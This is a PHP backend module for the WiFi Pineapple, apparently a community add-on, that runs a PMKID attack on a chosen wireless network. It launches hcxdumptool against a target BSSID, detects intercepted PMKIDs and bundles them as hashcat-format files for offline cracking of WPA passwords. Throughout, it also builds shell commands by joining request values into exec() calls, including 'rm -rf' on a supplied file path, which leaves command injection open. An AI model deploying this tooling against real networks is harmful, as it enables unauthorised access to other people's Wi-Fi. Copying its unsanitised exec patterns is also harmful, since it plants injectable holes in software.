<?php
/**
 * User: n3d.b0y
 * Email: n3d.b0y@gmail.com
 */

namespace pineapple;
putenv('LD_LIBRARY_PATH='.getenv('LD_LIBRARY_PATH').':/sd/lib:/sd/usr/lib');
putenv('PATH='.getenv('PATH').':/sd/usr/bin:/sd/usr/sbin');

class PMKIDAttack extends Module
{
    const PATH_MODULE = '/sd/modules/PMKIDAttack';
    const PATH_LOG_FILE = '/var/log/pmkidattack.log';

    public function route()
    {
        switch ($this->request->action) {
            case 'clearLog':
                $this->clearLog();
                break;
            case 'getLog':
                $this->getLog();
                break;
            case 'getDependenciesStatus':
                $this->getDependenciesStatus();
                break;
            case 'managerDependencies':
                $this->managerDependencies();
                break;
            case 'statusDependencies':
                $this->statusDependencies();
                break;
            case 'startAttack':
                $this->startAttack();
                break;
            case 'stopAttack':
                $this->stopAttack();
                break;
            case 'catchPMKID':
                $this->catchPMKID();
                break;
            case 'getPMKIDFiles':
                $this->getPMKIDFiles();
                break;
            case 'downloadPMKID':
                $this->downloadPMKID();
                break;
            case 'deletePMKID':
                $this->deletePMKID();
                break;
            case 'getOutput':
                $this->getOutput();
                break;
            case 'getStatusAttack':
                $this->getStatusAttack();
                break;
        }
    }

    protected function clearLog()
    {
        if (!file_exists(self::PATH_LOG_FILE)) {
            touch(self::PATH_LOG_FILE);
        }

	    exec('rm ' . self::PATH_LOG_FILE);
	    touch(self::PATH_LOG_FILE);
    }

    protected function getLog()
    {
        if (!file_exists(self::PATH_LOG_FILE)) {
            touch(self::PATH_LOG_FILE);
        }

        $file = file_get_contents(self::PATH_LOG_FILE);
       
        $this->response = array("pmkidlog" => $file);
    }

    protected function formatLog($massage)
    {
        return  '[' . date("Y-m-d H:i:s") . '] ' . $massage . PHP_EOL;
    }

    protected function getDependenciesStatus()
    {
        if (!file_exists('/tmp/PMKIDAttack.progress')) {
            if ($this->checkDependency()) {
                $this->response = array(
                    "installed" => false, "install" => "Remove",
                    "installLabel" => "danger", "processing" => false
                );
            } else {
                $this->response = array(
                    "installed" => true, "install" => "Install",
                    "installLabel" => "success", "processing" => false
                );
            }
        } else {
            $this->response = array(
                "installed" => false, "install" => "Installing...",
                "installLabel" => "warning", "processing" => true
            );
        }
    }

    protected function checkDependency()
    {
        return ((trim(exec("which hcxdumptool")) == '' ? false : true) && $this->uciGet("pmkidattack.module.installed"));
    }

    protected function managerDependencies()
    {
        if (!$this->checkDependency()) {
            $this->execBackground(self::PATH_MODULE . "/scripts/dependencies.sh install");
            $this->response = array('success' => true);
        } else {
            $this->execBackground(self::PATH_MODULE . "/scripts/dependencies.sh remove");
            $this->response = array('success' => true);
        }
    }

    protected function statusDependencies()
    {
        if (!file_exists('/tmp/PMKIDAttack.progress')) {
            $this->response = array('success' => true);
        } else {
            $this->response = array('success' => false);
        }
    }

    protected function startAttack()
    {
        $this->uciSet('pmkidattack.attack.bssid', $this->request->bssid);

        $this->uciSet('pmkidattack.attack.run', '1');
        exec("echo " . $this->getFormatBSSID() . " > " . self::PATH_MODULE . "/filter.txt");
        exec(self::PATH_MODULE . "/scripts/PMKIDAttack.sh start " . $this->getFormatBSSID());

        $massageLog = 'Start attack ' . $this->request->bssid;

        file_put_contents(self::PATH_LOG_FILE, $this->formatLog($massageLog), FILE_APPEND);

        $this->response = array('success' => true);
    }

    protected function stopAttack()
    {
        $this->uciSet('pmkidattack.attack.run', '0');

        exec("pkill hcxdumptool");

        if ($this->checkPMKID()) {
            exec('cp /tmp/' . $this->getFormatBSSID() . '.pcapng ' . self::PATH_MODULE . '/pcapng/');
        }

        exec("rm -rf /tmp/" . $this->getFormatBSSID() . '.pcapng');
        exec("rm -rf " . self::PATH_MODULE . "/log/output.txt");

        $massageLog = 'Stop attack ' . $this->getBSSID();

        file_put_contents(self::PATH_LOG_FILE, $this->formatLog($massageLog), FILE_APPEND);

        $this->response = array('success' => true);
    }


    protected function catchPMKID()
    {
        if ($this->checkPMKID()) {
            $massageLog = 'PMKID ' . $this->getBSSID() . ' intercepted!';

            file_put_contents(self::PATH_LOG_FILE, $this->formatLog($massageLog), FILE_APPEND);
            $this->response = array('success' => true);
        } else {
            $this->response = array('success' => false);
        }
    }

    protected function getFormatBSSID()
    {
        $bssid = $this->uciGet('pmkidattack.attack.bssid');
        $bssidFormat = str_replace(':', '', $bssid);

        return $bssidFormat;
    }

    protected function getBSSID()
    {
        return $this->uciGet('pmkidattack.attack.bssid');
    }

    protected function checkPMKID()
    {
        $searchLine = 'PMKIDs';

        exec('hcxpcaptool -z /tmp/pmkid.txt /tmp/' . $this->getFormatBSSID() . '.pcapng  &> ' . self::PATH_MODULE . '/log/output.txt');
        $file = file_get_contents(self::PATH_MODULE . '/log/output.txt');
        exec('rm -r /tmp/pmkid.txt');

        return strpos($file, $searchLine) !== false;
    }

    protected function getPMKIDFiles()
    {
        $pmkids = [];
        exec("find -L " . self::PATH_MODULE . "/pcapng/ -type f -name \"*.**pcapng\" 2>&1", $files);

        if (strpos($files[0], 'find') !== false) {
            $pmkids = [];
        } else {
            foreach ($files as $file) {
                array_push($pmkids,[
                    'path' => $file,
                    'name' => implode(str_split(basename($file, '.pcapng'), 2), ":")
                ]);
            }
        }

        $this->response = array("pmkids" => $pmkids);
    }

    protected function downloadPMKID()
    {
        $fileName = basename($this->request->file, '.pcapng');

        exec("mkdir /tmp/PMKIDAttack/");
        exec("cp " . $this->request->file . " /tmp/PMKIDAttack/");
        exec('hcxpcaptool -z /tmp/PMKIDAttack/pmkid.16800 ' . $this->request->file . ' &> ' . self::PATH_MODULE . '/log/output3.txt');
        exec('rm -r ' . self::PATH_MODULE . '/log/output3.txt');
        exec("cd /tmp/PMKIDAttack/ && tar -czf /tmp/". $fileName .".tar.gz *");
        exec("rm -rf /tmp/PMKIDAttack/");
        $this->response = array("download" => $this->downloadFile("/tmp/". $fileName .".tar.gz"));
    }

    protected function deletePMKID()
    {
        exec("rm -rf " . $this->request->file);
    }

    protected function getOutput()
    {
        if (!empty($this->request->pathPMKID)) {
            exec('hcxpcaptool -z /tmp/pmkid.txt ' . $this->request->pathPMKID . ' &> ' . self::PATH_MODULE . '/log/output2.txt');
            $output = file_get_contents(self::PATH_MODULE . '/log/output2.txt');
            exec("rm -rf " . self::PATH_MODULE . "/log/output2.txt");
        } else {
            $output = file_get_contents(self::PATH_MODULE . '/log/output.txt');
        }

        $this->response = array("output" => $output);
    }

    protected function getStatusAttack()
    {
        if ($this->uciGet('pmkidattack.attack.run') == '1') {
            $this->response = array('success' => true);
        } else {
            $this->response = array('success' => false);
        }
    }
}
